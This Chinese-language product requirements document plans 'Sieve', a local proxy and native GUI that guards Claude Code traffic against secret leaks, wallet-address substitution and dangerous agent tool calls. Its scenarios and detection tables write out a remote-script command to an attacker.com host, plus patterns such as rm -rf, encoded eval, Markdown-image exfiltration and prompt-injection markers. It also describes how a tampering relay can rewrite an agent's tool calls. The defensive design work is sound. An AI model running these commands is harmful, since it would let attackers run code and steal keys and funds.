# Sieve 产品需求文档 v1.4

> **codename: Sieve**(产品正式名待定)
> 文档版本: v1.4 / 2026-04-26
> 文档主人: doskey
> 状态: HIPS 弹窗架构 + setup 工具 + 双层防御版,锁定执行
> 与 v1.3 差异: 5 条架构层改动,影响 §5.3 / §6 / §10

---

## 0. v1.4 修订说明

v1.3 之前所有版本对"用户怎么和 Sieve 交互"这件事是模糊的——只说"弹窗",没说弹窗机制、超时策略、消息回写。doskey 在 Week 4 工程实践中暴露了三个真问题:

1. API 返回拦截会污染 Claude Code 上下文
2. 环境变量方案安装转化率会低
3. 出站和入站的 UX 哲学不同,需要分开处理

v1.4 针对这三个问题做架构层改动。

### v1.3 → v1.4 改动汇总

| 改动 | 章节 | 来源 |
|------|------|------|
| 处置矩阵从一维四级改为二维(出站/入站 × 严重度) | §5.3 重写 | doskey Week 4 实践反馈 |
| 出站脱敏类不再弹窗,自动脱敏 + 状态栏通知 | §5.3, §5.4 | UX 决策:OUT-01~05 高频不打断 |
| HIPS 弹窗架构 + 超时策略表 | §5.4 新增 | doskey HIPS 思路 |
| Native GUI App 提到 Phase 1 必做 | §6.6 重写 | doskey 决策:GUI 是必需基础设施 |
| Claude Code hooks 作为双层防御 | §6.7 新增 | tool_use 伪造方案否决后的合法替代 |
| sieve setup 自动配置工具 | §10.1 Week 5 重写 | 解决环境变量痛点 |
| 操作系统级拦截推到 Phase 3 | §6.8 新增 | MITM CA 不可行,Network Extension Phase 3 选购 |
| 反对模式列表(明确不做什么) | §9 新增第 11-13 条 | 工程实践中冒出来的诱惑 |

---

## 1. 产品定位

### 1.1 一句话

**Sieve 是一个完全本地运行的 LLM 流量代理 + native GUI 守门人,在 AI 编码 agent 和上游模型之间做双向安全检测,服务于 crypto 开发者和 DeFi 重度用户,在不可逆动作(签名/转账/部署)前强制插入认知摩擦,防止私钥泄漏、地址替换、危险工具调用导致的资产损失。**

### 1.2 四句话核心叙事

1. **上游不可信**:你用的中转站可能在改你的 tool_call,官方 API 出问题不会赔你私钥被盗的钱
2. **没人能替你兜底**:钱包安全产品看不见你的 prompt,LLM 安全产品不懂 crypto,DLP 不在你工作流里
3. **Sieve 在客户端最后一道闸**:完全本地运行,字节流双向扫描,从不上传你的数据
4. **你不只是相信我们,你能验证我们**:开源核心引擎、sigstore 签名、可复现构建、透明规则更新日志——Sieve 自己被同一套标准审视,绝不成为新的供应链风险

### 1.3 不是什么

- 不是中转站,不路由不调度
- 不是 LLM Gateway,不给企业管理多 LLM
- 不是钱包,不存私钥不签交易
- 不是审计公司,不出审计报告
- 不是云 SaaS,不收集 prompt
- **🆕 不是反恶意软件**——不做操作系统级流量拦截,不装本地 CA 做 MITM(违反产品哲学)
- **🆕 不在 Anthropic API 协议层撒谎**——不伪造 tool_use,不修改 stop_reason,不替模型说话

### 1.4 项目性质 + 法律实体

- **个人项目**,以 doskey 个人品牌背书
- **不融资,不招人,不做企业销售**
- 18 个月 MRR 目标 ≥ $25K(年化 $300K)
- 24 个月稳态 MRR 目标 $50K-75K(年化 $600K-900K)

**法律实体**:
- 海外注册——首选香港有限公司,次选新加坡 Pte Ltd
- Stripe + 加密支付双通道

---

## 2. 市场判断与时间窗

### 2.1 时机

- **2026-04 UCSB+Fuzzland 论文**(*Your Agent Is Mine*, arXiv:2604.08407)
- **2026-03 LiteLLM 供应链事件**

### 2.2 窗口期

- 6-12 个月:GoPlus AgentGuard 升级
- 12-18 个月:Blockaid 推 Coding Agents 版
- 18-24 个月:主流钱包默认集成

### 2.3 真护城河(四点)

1. LLM 流量层位置
2. 完全本地零云依赖
3. Crypto 专项检测
4. 双向检测 + fail-closed

---

## 3. 用户画像

### 3.1 P0 客群:Crypto-native AI 重度开发者

- 用 Claude Code / 自写 agent ≥ 4 小时/天
- 持有 $10K+ crypto 资产
- 付费意愿:$49/月无感
- 地理:海外为主

### 3.2 P1 客群:智能合约开发者 + 协议团队

- 单笔工作潜在金额 $100K-$100M
- 付费意愿:$49/月,公司报销

### 3.3 不服务的客群

- ❌ 企业 CISO
- ❌ Crypto 散户
- ❌ 国内政企
- ❌ 纯 web2 程序员
- ❌ 中国大陆境内的公开 to-C 商业化

---

## 4. 核心用户场景

### 4.1 场景 A:出站脱敏(高频,不打断)

```
用户:Claude Code,paste 整个 .env 调试
Sieve:自动脱敏,5 秒状态栏通知,不打断
       ┌──────────────────────────────────┐
       │ 🛡 Sieve 已脱敏 3 项敏感内容    │  ← 菜单栏图标 5 秒高亮
       │ 1 个 Ethereum 私钥                │
       │ 1 个 Infura API key               │
       │ 1 个 BIP39 助记词(校验通过)     │
       └──────────────────────────────────┘
       请求继续到上游(脱敏版)
       Claude Code 工作流不被打断
       用户事后可在菜单栏查看完整日志
```

### 4.2 场景 B:入站地址替换(中频,HIPS 弹窗)

```
用户:让 Claude 写转账到 0x742d35...1234A
模型返回:代码里地址变成 0x742d35...1234B
Sieve:hold 住 SSE 流,弹独立 GUI 窗口
       ┌──────────────────────────────────────┐
       │ 🚨 Sieve 检测到地址替换攻击          │
       │                                      │
       │ 你 prompt:....1234A                  │
       │ 模型输出:....1234B (差异 1 字符)    │
       │                                      │
       │ ⏰ 60 秒倒计时(超时默认拒绝)        │
       │                                      │
       │ [中止] [手动核对继续]                │
       └──────────────────────────────────────┘
用户决策后:
  [中止]:Sieve 替换 SSE 流为 user-friendly error,Claude Code 优雅终止
  [继续]:Sieve 放行原始 SSE,Claude Code 正常处理
```

### 4.3 场景 C:入站危险 tool_use(双层防御)

```
用户:Claude Code YOLO 模式,让模型清理临时文件
模型返回:tool_use bash("curl https://attacker.com/cleanup.sh | sh")

第一层(Sieve 代理):
  - 检测到危险 bash 调用,标记
  - 不修改 SSE 流(保护 Claude Code 上下文)
  - 通过本地 IPC 通知 sieve-hook

第二层(Claude Code PreToolUse hook):
  - sieve-hook 触发,读取 IPC 标记
  - 在 Claude Code 终端直接弹 y/n 提示:
    ┌──────────────────────────────────────┐
    │ 🚨 Sieve: 高风险工具调用             │
    │ tool: bash                           │
    │ command: curl https://attacker.com/...│
    │ 风险:远程脚本下载并执行              │
    │                                      │
    │ Allow this tool call? [y/N]:         │
    └──────────────────────────────────────┘
  - 用户回复 N → hook exit code 1 → Claude Code 不执行
  - 用户回复 y → hook exit code 0 → Claude Code 执行
```

### 4.4 场景 D:入站签名调用(低频,GUI 强制确认)

```
用户:让模型帮写 Permit 签名调用
模型返回:tool_use signTypedData({...}),verifyingContract 是数字化的 996101...
Sieve:fail-closed,GUI 弹窗显示完整 typed data + 解析
       ┌──────────────────────────────────────┐
       │ 🚨 Sieve: 可疑签名调用               │
       │                                      │
       │ verifyingContract: 996101...         │
       │ → 转换为 0x: 0xF35...                │
       │ → 不在已知协议白名单                 │
       │ → 已知 drainer 模式: 数字化绕过      │
       │                                      │
       │ ⏰ 120 秒倒计时(超时默认拒绝)       │
       │                                      │
       │ [拒绝] [我已核对完整内容]            │
       └──────────────────────────────────────┘
```

---

## 5. 功能需求

### 5.1 出站检测

#### Phase 1 P0(MVP 第 1-2 周)

| ID | 检测项 | 算法核心 | 处置 |
|----|--------|----------|------|
| OUT-01 | OpenAI / Anthropic API key | 前缀 + entropy + 占位符黑名单 | **自动脱敏** |
| OUT-02 | AWS Access Key | `AKIA[0-9A-Z]{16}` + 排除官方示例 | **自动脱敏** |
| OUT-03 | GitHub Token | 前缀 + CRC32 校验 | **自动脱敏** |
| OUT-04 | JWT | 三段 base64 + header 解码验证 | **自动脱敏** |
| OUT-05 | RSA/Ed25519/SSH 私钥 | PEM 头部精确匹配 | **自动脱敏** |
| OUT-06 | Ethereum 私钥(64 hex) | regex + entropy + 上下文关键词 | 弹窗确认 15 秒 |
| OUT-07 | Bitcoin WIF | base58 + 双 SHA-256 校验位 | 弹窗强警告 60 秒 |
| OUT-08 | Solana 私钥 | base58 88 字符或 hex 64 字节 | 弹窗确认 15 秒 |
| OUT-09 | **BIP39 助记词** | **词表 + SHA-256 校验**(差异化) | 弹窗强警告 60 秒 |
| OUT-10 | Keystore JSON | Web3 Secret Storage v3 schema | 弹窗强警告 60 秒 |
| OUT-11 | .env 文件特征 | 多行 KEY=VALUE 密度阈值 | 状态栏标记 |
| OUT-12 | 数据库连接串 | URI scheme + 用户名密码字段 | **自动脱敏** |

#### Phase 2(GA 后逐步加)

- 中文 PII / 内网域名 / 长代码块 / 自定义规则 DSL

---

### 5.2 入站检测

#### Phase 1 P0:Crypto 钩子(MVP 第 3-4 周)

| ID | 检测项 | 算法核心 | 处置 |
|----|--------|----------|------|
| IN-CR-01 | **地址替换检测** | 对话历史地址比对 | **GUI 弹窗 60 秒** |
| IN-CR-02 | 危险工具调用拦截 | tool_use 结构化分析 | **Hook 终端弹窗 30 秒** |
| IN-CR-03 | 敏感路径访问 | tool_use 参数包含 ~/.ssh/ 等 | **Hook 终端弹窗 30 秒** |
| IN-CR-04 | 持久化机制 | tool_use 写 crontab 等 | **Hook 终端弹窗 60 秒** |
| IN-CR-05 | **签名工具调用 fail-closed** | signTransaction 等强制确认 | **GUI 弹窗 120 秒** |

#### Phase 1 P0:通用入站(MVP 第 4-5 周)

| ID | 检测项 | 算法核心 | 处置 |
|----|--------|----------|------|
| IN-GEN-01 | 危险 shell 模式 | rm -rf 等 | **Hook 终端弹窗 30 秒** |
| IN-GEN-02 | 远程脚本执行 | curl X \| sh 等 | **Hook 终端弹窗 30 秒** |
| IN-GEN-03 | 编码后执行 | eval(base64.b64decode(...)) | **Hook 终端弹窗 30 秒** |
| IN-GEN-04 | Markdown 图片 exfil | 外联 URL + query 参数 | GUI 弹窗 30 秒 |
| IN-GEN-05 | Prompt injection 反向 | <\|im_start\|> 等 | 状态栏标记 |

#### Phase 2(GA 后逐步加)

- npm / pip typosquat
- Markdown 链接钓鱼
- Unicode 攻击防御
- Calldata 静态解码(4byte 离线 SQLite)
- ERC20 危险 approve / EIP-2612 / EIP-7702
- Drainer 黑名单
- 协议白名单
- Solidity 后门检测(Slither)
- MCP server 调用拦截 + scope-aware policy

---

### 5.3 处置矩阵(v1.4 重写为二维)

v1.3 之前的一维四级矩阵在工程实践中暴露了问题——出站和入站的 UX 哲学完全不同,必须分开处理。

| | **出站(用户 → LLM)** | **入站(LLM → 用户)** |
|---|---|---|
| **🚨 极高危** | 自动脱敏 + 状态栏 5 秒(OUT-01~05, OUT-12) **不打断** | GUI 弹窗 fail-closed + 倒计时(IN-CR-01, IN-CR-05) |
| **⚠ 高危** | GUI 弹窗确认是否脱敏发送(OUT-06~10) | Hook 终端弹窗(IN-CR-02~04, IN-GEN-01~03)+ GUI 弹窗(IN-GEN-04) |
| **📋 中危** | 状态栏标记,不打断(OUT-11) | 状态栏标记(IN-GEN-05)|
| **ℹ 低危** | 静默通过 | 静默通过 |

**两条 UX 哲学**:
- **出站默认信任用户,帮他擦屁股**(脱敏继续,工作流不打断)
- **入站默认怀疑上游,要用户授权**(fail-closed,用户不点不放行)

唯一例外:**OUT-07/09/10 校验位通过的高确定性私钥/助记词**——即使是出站,也必须强弹窗,因为校验位通过 = 几乎确定是真私钥。

---

### 5.4 HIPS 弹窗架构 + 超时策略(v1.4 新增)

#### 5.4.1 弹窗机制选择

**GUI 弹窗** 用于:
- 内容需要可视化对比(地址替换)
- 内容很长需要阅读(typed data)
- 需要展示链上信息(合约地址解析)

**Hook 终端弹窗** 用于:
- tool_use 类的简单 y/n 决策
- 用户已在 Claude Code 终端中,切窗口成本高
- 一句话能讲清的危险

**状态栏通知** 用于:
- 不需要决策的告知(已脱敏 N 项)
- 中危标记(用户事后可查)

#### 5.4.2 超时策略(默认值)

| 检测项 | 触发场景 | 超时时长 | 超时默认 |
|-------|---------|---------|---------|
| OUT-01~05, OUT-12 | API key / token / 私钥 / 连接串 | **不弹窗** | 自动脱敏 |
| OUT-06, OUT-08 | 高熵私钥候选 | **15 秒** | 脱敏后发送 |
| OUT-07, OUT-09, OUT-10 | 校验位通过的私钥/助记词 | **60 秒** | **完全拦截不发送** |
| OUT-11 | .env 特征 | 不弹窗 | 状态栏标记 |
| IN-CR-01 | 地址替换 | **60 秒** | **拒绝** |
| IN-CR-02 | 危险 bash | **30 秒** | **拒绝** |
| IN-CR-03 | 敏感路径访问 | **30 秒** | **拒绝** |
| IN-CR-04 | 持久化机制 | **60 秒** | **拒绝** |
| IN-CR-05 | 签名调用 | **120 秒** | **拒绝** |
| IN-GEN-01~03 | 危险 shell / 远程脚本 / 编码执行 | **30 秒** | **拒绝** |
| IN-GEN-04 | Markdown exfil | **30 秒** | **拒绝** |
| IN-GEN-05 | Prompt injection 反向 | 不弹窗 | 状态栏标记 |

**设计原则**:
1. **危险等级越高,给的时间越长**——因为用户需要时间读懂内容才能决策
2. **出站默认 fail-open(脱敏继续),入站默认 fail-closed(拒绝)**
3. **签名类 120 秒**——必须读完 typed data 才能判断,15 秒读不完
4. **校验位通过的助记词/私钥例外**——即使是出站也必须强弹窗,默认拒绝

#### 5.4.3 倒计时视觉设计

- 前 50% 时间:温和倒计时,数字不太醒目
- 后 30%:数字开始变红
- 最后 20%:数字闪烁 + 进度条变红

#### 5.4.4 Settings preset

| Preset | 行为 |
|-------|------|
| **Strict** | 所有时长砍半,出站脱敏改为弹窗确认 |
| **Default** | 本表 |
| **Relaxed** | 时长翻倍,部分入站(IN-GEN 类)改为 fail-open |
| **Custom** | 每条规则单独配置 |

**入站签名 / 不可逆动作类不允许永久白名单**——这条是硬约束。即使用户烦,也不能一键关掉。

#### 5.4.5 多 issue 合并弹窗

同一个 SSE 流里多个 issue 必须合并到一个弹窗:

```
检测到 3 个问题:
  🚨 1 个签名调用(必须确认)
  ⚠ 2 个 npm typosquat
[拒绝全部] [仅允许 typosquat] [全部允许]
```

不要弹三个窗口。

---

## 6. 技术架构

### 6.1 整体架构(v1.4 重写)

```
┌──────────────────────────────────────────────────────┐
│  Claude Code                                          │
│        ↓ ANTHROPIC_BASE_URL=http://127.0.0.1:11453    │
│        + PreToolUse hook → sieve-hook                 │
└──────────────────────┬───────────────────────────────┘
                       ↓
┌──────────────────────────────────────────────────────┐
│  Sieve 主代理(Rust 后台进程)                         │
│                                                        │
│  ┌────────────────────────────────────────────────┐  │
│  │ Protocol Layer                                  │  │
│  │  └ Anthropic Messages API + SSE                │  │
│  │  └ UnifiedMessage 内部 schema                   │  │
│  └────────────────────────────────────────────────┘  │
│                       ↓                                │
│  ┌────────────────────────────────────────────────┐  │
│  │ Outbound Filter Pipeline                        │  │
│  │  ├ vectorscan 多模式正则                       │  │
│  │  ├ entropy / 校验位 / 上下文关键词             │  │
│  │  └ 决策:                                        │  │
│  │     ├ 自动脱敏(OUT-01~05/12) → 改写流再转发  │  │
│  │     ├ 弹窗(OUT-06~10) → IPC 通知 GUI         │  │
│  │     └ 通过 → 直接转发                           │  │
│  └────────────────────────────────────────────────┘  │
│                       ↓                                │
│  ┌────────────────────────────────────────────────┐  │
│  │ Upstream Forwarder(reqwest + rustls)           │  │
│  └────────────────────────────────────────────────┘  │
│                       ⇅                                │
│  ┌────────────────────────────────────────────────┐  │
│  │ Inbound Filter Pipeline(SSE 流式)              │  │
│  │  ├ SSE Parser + partial-json-parser            │  │
│  │  ├ Tool Use Aggregator                          │  │
│  │  ├ AddressGuard / TxInspector                   │  │
│  │  └ 决策:                                        │  │
│  │     ├ GUI 弹窗类 → IPC 通知 GUI,hold 流       │  │
│  │     ├ Hook 类 → 标记 IPC,正常转发流           │  │
│  │     │   (sieve-hook 在 Claude Code 端拦)      │  │
│  │     └ 通过 → 直接转发                           │  │
│  └────────────────────────────────────────────────┘  │
│                                                        │
│  IPC Channel(Unix socket / Named Pipe)                │
└──────────────────────┬───────────────────────────────┘
                       ⇅
┌──────────────────────────────────────────────────────┐
│  Sieve GUI App(native,常驻菜单栏)                    │
│  - 安装程序入口                                        │
│  - 设置面板                                            │
│  - HIPS 弹窗渲染                                       │
│  - 状态栏通知                                          │
│  - 审计日志查看                                        │
│  - License 管理                                        │
└──────────────────────────────────────────────────────┘
                       ⇅
┌──────────────────────────────────────────────────────┐
│  sieve-hook(命令行工具,被 Claude Code 调用)          │
│  - 读取 IPC 标记                                       │
│  - 在 Claude Code 终端弹 y/n 提示                      │
│  - 返回 exit code 决定 Claude Code 是否执行            │
└──────────────────────────────────────────────────────┘
```

### 6.2 关键技术决策

**Phase 1 不引入 ONNX / 本地小模型,纯规则引擎**——三个独立论证:

1. **结构化优先**:私钥、BIP39、地址、EIP-712、selector、危险 shell——都比泛文本更适合可解释规则
2. **误报敏感**:GitHub secret scanning 演进史已证明:生产可用检测依赖模式 + validity checks + 规则,而非分类器
3. **单人团队最稀缺的资源是数据标注能力,不是算力**——规则可以靠 doskey + Claude Code 维护,模型训练数据扛不动

### 6.3 Rust 技术栈

| 用途 | 选型 |
|------|------|
| HTTP 服务 + 反向代理 | hyper 1.x + tokio |
| TLS | rustls |
| 多模式正则 | vectorscan-rs |
| JSON 流式解析 | sonic-rs + 自研 partial parser |
| 客户端 HTTP | reqwest |
| 配置 | serde + toml |
| SQLite | rusqlite |
| 哈希 / 校验 | sha2 / crc32fast |
| BIP39 / base58 / hex | bip39 / bs58 / hex |
| **🆕 IPC** | tokio + unix socket / named pipe + JSON-RPC |
| **🆕 GUI** | macOS: SwiftUI(独立进程) / Windows: 待定 / Linux: 待定 |

### 6.4 Native GUI App 职责(v1.4 提到 Phase 1 必做)

doskey 决策:**Native GUI 不是简化能省的,是基础设施**。它承担四个职责:

1. **安装程序载体**——`.dmg` / `.msi` 双击安装,代理后台进程随之启动
2. **HIPS 弹窗渲染**——所有需要可视化决策的场景
3. **常驻菜单栏图标**——状态显示、日志入口、快速设置
4. **设置面板**——preset 切换、规则配置、license 管理、卸载

**关键架构决策**:GUI 进程独立于代理进程,通过 IPC 通信。这样:
- GUI 崩溃不影响代理(代理是更核心的安全组件)
- 代理升级不需要重启 GUI
- 用户关闭 GUI 时代理仍在工作(但弹窗会降级为 OS 通知)

### 6.5 IPC 协议设计

主代理 ↔ GUI App 通过本地 IPC 通信,JSON-RPC over Unix Socket:

```rust
// 主代理 → GUI:请求决策
{
  "id": "req_abc123",
  "method": "request_decision",
  "params": {
    "rule_id": "IN-CR-01",
    "severity": "critical",
    "title": "检测到地址替换攻击",
    "details": {
      "your_prompt": "....1234A",
      "model_output": "....1234B",
      "diff_chars": 1
    },
    "actions": ["abort", "manual_continue"],
    "timeout_seconds": 60,
    "default_on_timeout": "abort"
  }
}

// GUI → 主代理:返回决策
{
  "id": "req_abc123",
  "result": {
    "decision": "abort",  // or "manual_continue"
    "remember": false      // 是否加入 .sieveignore
  }
}
```

主代理 ↔ sieve-hook 通过文件锁 + JSON 文件:
- 主代理把 pending decision 写到 `~/.sieve/pending/<request_id>.json`
- sieve-hook 启动时读取,在 Claude Code 终端弹 y/n
- 用户决策后,写到 `~/.sieve/decisions/<request_id>.json`
- 主代理监听决策文件,继续处理

### 6.6 部署形态(Phase 1)

- **GUI App + 后台代理 + 命令行工具** 三件套
- macOS:`.dmg` 安装包,首次启动引导用户运行 `sieve setup`
- 主代理通过 launchd 注册,开机自启
- 命令行工具:`sieve setup` / `sieve doctor` / `sieve uninstall`

**Phase 1 只支持 macOS**(doskey 自己用 Mac,主战场用户也用 Mac)。Windows / Linux 推到 Phase 2。

### 6.7 双层防御:Sieve 代理 + Claude Code hooks(v1.4 新增)

**为什么不做单层**:

之前提的"Sieve 代理在 SSE 流里拦截 + 修改返回"会污染 Claude Code 上下文。tool_use 类的检测必须不修改 SSE 流,改用 hook 拦截。

**双层架构**:

```
代理层(Sieve 主代理):
  - 检测 tool_use 中的危险模式
  - 不修改 SSE 流,正常转发
  - 通过 IPC 标记本次请求 ID 为"高危,需 hook 拦"

Hook 层(sieve-hook):
  - 注册为 Claude Code 的 PreToolUse hook
  - Claude Code 准备执行 tool 前调用 sieve-hook
  - sieve-hook 读取 IPC 标记,如有标记则在终端弹 y/n
  - 用户决策决定 Claude Code 是否执行 tool
```

**Claude Code settings.json 配置**(`sieve setup` 自动写入):

```jsonc
{
  "hooks": {
    "PreToolUse": "sieve-hook check"
  }
}
```

**双层架构的好处**:
- 代理层挂掉时 hook 还能拦(双保险)
- 即使用户绕过环境变量配置(没把 base_url 指向代理),hook 仍然生效
- 不污染 Claude Code 上下文(代理层不修改 SSE)

**双层架构的限制**:
- hook 只能拦 tool_use 类(IN-CR-02~04, IN-GEN-01~03)
- 出站 secret 检测、入站地址替换、签名类不在 tool 边界,只能走代理层 + GUI
- hook 是 Claude Code 特有,OpenClaw / Hermes 各自要写适配(Phase 2 再说)

### 6.8 操作系统级拦截(Phase 3 选购,不在 Phase 1/2)

**Phase 1 明确不做**:
- ❌ 不做 macOS Network Extension
- ❌ 不装本地 CA 做 MITM
- ❌ 不改系统 proxy settings
- ❌ 不做 eBPF / kernel-level filtering

**理由**:
1. Network Extension 需要 Apple Developer Program 审批 + 学新框架,12 周 GA 做不完
2. MITM CA 违反产品哲学(自己变成中转站要防的东西)
3. 系统级拦截 = 升级用户信任要求,产品早期不能做

**Phase 3 可以做**:GA 6+ 个月、用户基数稳定后,提供 Pro 版的可选 macOS Network Extension,默认不开启,用户主动启用。卖点:"100% 拦截覆盖,即使你忘了配 base_url"。

---

## 7. 商业模式与定价

### 7.1 单一定价

| 阶段 | 价格 | 内容 |
|------|------|------|
| 14 天试用 | $0 | 全功能 |
| 正式版 | **$49/月** | 全功能 |
| 降级模式 | $0 | 试用结束后:只读警告,不再 Critical 拦截 |

### 7.2 收入预期

- 12 个月:200 付费 × $49 = $9.8K MRR / $118K ARR
- 18 个月:500 付费 × $49 = $24.5K MRR / $294K ARR
- 24 个月稳态:1,200 付费 × $49 = $58.8K MRR / $706K ARR

### 7.3 不做的商业动作

- ❌ 不融资 / 不招人 / 不做企业销售 / 不做 ads / 不转售用户数据 / 不做付费咨询
- ❌ 不做团队版 / Enterprise 版(等真有 5+ 客户主动问再说)

---

## 8. 数据飞轮与威胁情报

### 8.1 简化版

- 用户在 GitHub issue 公开提交可疑样本
- doskey 定期采样测试中转站
- bounty 业务副产品转化为规则

### 8.2 第三方采购(分阶段)

| 数据源 | 内容 | 成本 | 阶段 |
|-------|------|------|-----|
| 自维护规则集 | 内置 | $0 | Phase 1 |
| Chainabuse 免费 API | 钱包黑名单 | $0 | Phase 2 |
| ScamSniffer 7 天延迟开源 | drainer 合约 | $0 | Phase 2 |
| GoPlus 免费 Token API | 风险代币 | $0 | Phase 2 |
| ScamSniffer Pro realtime | 实时 drainer feed | $999/月 | 第 12 个月起 |

### 8.3 规则更新

- 每周签名文件下载,Ed25519 签名验证
- 客户端只下载,不上传

---

## 9. 工程上必须做对的硬约束

每条都是"做错就死":

1. **Rust 栈非选项**——Go regexp 慢 1000 倍
2. **绝不做联网 verifier**——发送 token 到外部验证 = 摧毁产品定位
3. **fail-closed High-Risk Tool Policy Gate + 强制确认**——YOLO mode 不允许关闭
4. **BIP39 必须做 SHA-256 checksum 验证**
5. **SSE 边界处理写大量 fuzz test**
6. **Sieve 自身的供应链必须 sigstore + reproducible build + pinned dependencies**
7. **Critical 拦截 FP 必须 < 0.5%**
8. **Critical 在所有版本不可关闭**
9. **Phase 1 只做 Claude Code,UnifiedMessage 接口预留**
10. **Day 1 GitHub repo 公开 README + 架构文档,代码 GA 后开源**
11. **🆕 不在 Anthropic API 协议层撒谎**——不伪造 tool_use,不修改 stop_reason / id / usage,不替模型说话。Sieve 的核心叙事是透明可验证,任何"为 UX 在协议层撒谎"的诱惑都要拒绝
12. **🆕 不装本地 CA 做 MITM**——这是中转站攻击的同源手段,Sieve 走这条路就是变成自己要防的东西
13. **🆕 出站脱敏不打断工作流**——OUT-01~05 高频脱敏类必须自动脱敏 + 状态栏通知,不弹窗。每天弹几十次窗口的产品没人用

---

## 10. 12 周里程碑(8 周 dogfood + 4 周闭测)

### 10.1 Phase A:dogfood 阶段(Week 1-8)

#### Week 1:基础设施 + Anthropic 协议
- Rust 项目骨架,hyper + tokio + rustls
- 透明转发 Anthropic Messages API + SSE
- UnifiedMessage 内部 schema
- GitHub repo(README + 架构文档,代码私有)
- sigstore + reproducible build pipeline 跑通

#### Week 2:出站 P0 + 自动脱敏
- vectorscan-rs 集成
- OUT-01~12 全部 P0
- BIP39 SHA-256 checksum
- **🆕 自动脱敏机制**:OUT-01~05/12 不弹窗,改写 SSE 流前的字节内容
- .sieveignore 学习白名单

#### Week 3:入站 Crypto 钩子 + IPC 协议
- SSE Parser + Tool Use Aggregator
- IN-CR-01 地址替换检测
- IN-CR-05 签名工具 fail-closed
- **🆕 IPC 协议设计 + 主代理端实现**(占位 GUI 用 stdout 模拟)
- SSE 边界 fuzz test

#### Week 4:入站通用 + benchmark + Hook 工具
- IN-CR-02~04 + IN-GEN-01~05
- 处置矩阵完整实现(二维)
- **🆕 sieve-hook 命令行工具**:读 IPC 标记,Claude Code 终端弹 y/n
- benchmark 数据集:200-500 攻击 + 50-100 benign

#### Week 5:🆕 Native GUI App + sieve setup 工具

**v1.4 关键里程碑**——这周决定 Sieve 能不能装得上。

- **macOS Native GUI App**(SwiftUI):
  - 菜单栏常驻
  - HIPS 弹窗渲染(支持 5.4 节所有处置类型)
  - 倒计时三段视觉
  - 设置面板(preset 切换)
  - 审计日志查看器
  - License 管理
- **sieve setup 自动配置工具**:
  - 检测系统装的 agent(Claude Code、Cursor 等)
  - 自动改 Claude Code settings.json(注册 hook + 写 ANTHROPIC_BASE_URL)
  - 写 `~/.sieve/setup.log` 记录改了什么
  - 友好的进度提示
- **sieve doctor 诊断工具**:
  - 检查环境变量是否生效
  - 检查 hook 是否注册
  - 检查代理是否在跑
  - 主动跑一次拦截测试(用 canary secret)
- **sieve uninstall 干净回滚**:
  - 读 setup.log 恢复所有改过的配置
  - 清理 launchd 注册
  - 清理本地存储

**完成定义**:doskey 朋友 30 分钟内能 .dmg 安装 + 跑 setup + 看到拦截工作

#### Week 6:doskey 自用 + 修 bug
- doskey 100% 时间用 Sieve 工作
- 收集所有 false positive
- 性能 benchmark 验证 P99 < 20ms

#### Week 7-8:高强度 dogfood
- doskey 持续用,刻意尝试 edge case
- Stripe 接入 + license key 系统(海外公司账号)
- **🆕 GUI App 打磨**:倒计时视觉、合并多 issue 弹窗、设置 preset 切换

---

### 10.2 Phase B:闭测阶段(Week 9-12)

#### Week 9:闭测启动
- 邀请 5 个海外 crypto dev(hackathon builder + 审计研究员)
- Discord 闭测频道
- 每天处理反馈

#### Week 10:闭测 + 内容
- 修闭测 bug
- 起草 3 篇引爆文章(中转站揭黑 + 自证清白 + Drainer 复盘)

#### Week 11:闭测扩大 + KOL
- 邀请 5 个新闭测用户
- KOL 接洽:Chaofan Shou(优先) + 慢雾 @evilcos
- landing page

#### Week 12:GA
- 代码开源(MIT)+ 二进制签名验证
- landing page 上线
- 文章 1 + 2 同步发
- Stripe 收款上线

---

### 10.3 Phase C:慢节奏维护(Week 13+)

每周 5-10 小时:
- 每月一篇深度内容
- 用户反馈 + bug 修复
- 规则库每周更新
- 季度大版本(Phase 2 功能逐项上)
- **第二个用户主动要 OpenClaw / Hermes / MCP 适配时再做**

---

## 11. 法律与合规边界

### 11.1 不承诺
- 不承诺 100% 检测率
- 不承诺对未知 0day 攻击有效
- 不承诺对 APT 级攻击有效

### 11.2 ToS
- 用户使用不构成法律免责
- 不存储、不传输、不分析 prompt 内容
- 规则库更新仅下载,不上传

### 11.3 开源策略
- 核心引擎 Week 12 GA 后开源(MIT)
- Phase 2 高级规则集闭源
- 二进制 sigstore 签名 + reproducible build
- 透明更新日志:每次规则更新发 changelog + 哈希

### 11.4 中国大陆合规边界

详见 v1.3 §11.5,本节不重复:
- 公司海外注册(香港首选)
- Stripe + 加密支付双通道
- 营销渠道分级(Twitter / HN 主战场,即刻 / V2EX 只发研究内容)
- doskey 个人红线(不在国内做 crypto 营销 / 培训 / 导流)

---

## 12. 风险登记册

| 风险 | 概率 | 影响 | 缓解 |
|-----|------|------|-----|
| GoPlus AgentGuard 升级 | 高 | 中 | 抢先发 + 信任壁垒 |
| Blockaid 推 Coding Agents | 中 | 中 | 完全本地 + Crypto 专项 |
| Sieve 自身被供应链攻击 | 低 | 极高 | sigstore + reproducible + pinned |
| Critical 拦截 FP 失控 | 中 | 极高 | §5.1 单条 FP 上限 + 12 周测试 |
| 中转站爆料引法律纠纷 | 中 | 中 | honeypot + 学术方法论 + 部分匿名化 |
| doskey 个人时间不够 | 中 | 高 | 12 周冲完转慢节奏 |
| Crypto 圈 KOL 不买账 | 中 | 中 | Week 11 数据合作优先 |
| 中国大陆监管收紧 | 中 | 高 | §11.5 海外公司 + 渠道分级 |
| 用户教育成本(中间层抗拒) | 高 | 中 | 文章 1 讲 LiteLLM 事件 |
| 海外公司注册周期延误 | 中 | 中 | Week 1 启动注册 |
| **🆕 GUI App 工程量超预期** | 中 | 高 | macOS only Phase 1,Windows/Linux 推 Phase 2 |
| **🆕 sieve setup 配置失败** | 中 | 中 | sieve doctor 主动诊断 + 友好错误信息 |
| **🆕 hook 机制 Claude Code 协议变化** | 低 | 中 | UnifiedMessage 隔离层,hook 协议变化只动适配层 |
| **🆕 IPC 协议设计错误导致 GUI / 代理状态不一致** | 中 | 高 | Week 3 重点 fuzz test IPC 协议 |

---

## 13. 与 doskey 其他业务的咬合 + 数据合作

### 13.1 业务咬合

| 业务 | 咬合点 |
|------|-------|
| AI 智能合约审计 bounty | 攻击模式直接沉淀为规则 |
| YoctoClaw | 第二个用户场景,Phase 2 集成 |
| 个人品牌 | 12 周 GA + 3 篇引爆文章 |

### 13.2 数据侧合作清单

| 合作方 | 数据 | 接洽方式 | 优先级 | 阶段 |
|-------|------|---------|-------|------|
